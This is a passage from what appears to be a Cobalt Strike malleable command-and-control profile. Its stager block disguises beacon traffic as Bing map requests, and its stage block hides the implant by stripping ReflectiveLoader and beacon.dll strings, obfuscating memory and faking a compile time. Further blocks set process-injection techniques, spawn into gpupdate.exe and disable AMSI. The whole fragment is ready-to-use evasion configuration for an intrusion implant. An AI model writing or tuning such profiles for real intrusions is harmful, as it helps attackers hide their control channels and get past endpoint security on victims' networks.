            append "            \"entry\": \"EducationPoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 90584,";
            append "            \"bucketId\": 310,";
            append "            \"entry\": \"CommunityPoint\"";
            append "        },";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {
	set uri_x86 "/maps/overlayBFPR";
	set uri_x64 "/maps/overlayBfpr";
    
    client {

        header "Host" "www.bing.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";
    }
    
    server {
    
    	header "Cache-Control" "public";
        header "Content-Type" "text/html;charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "P3P" "\"NON UNI COM NAV STA LOC CURa DEVa PSAa PSDa OUR IND\"";
        header "X-MSEdge-Ref" "Ref A: 20D7023F5A1946FFA6E18C00CC8216CF Ref B: DALEDGE0815";
        header "Connection" "close";
    
    	output {
    	
    		print;
    	}
    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "12 Dec 2019 02:52:11";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";

}
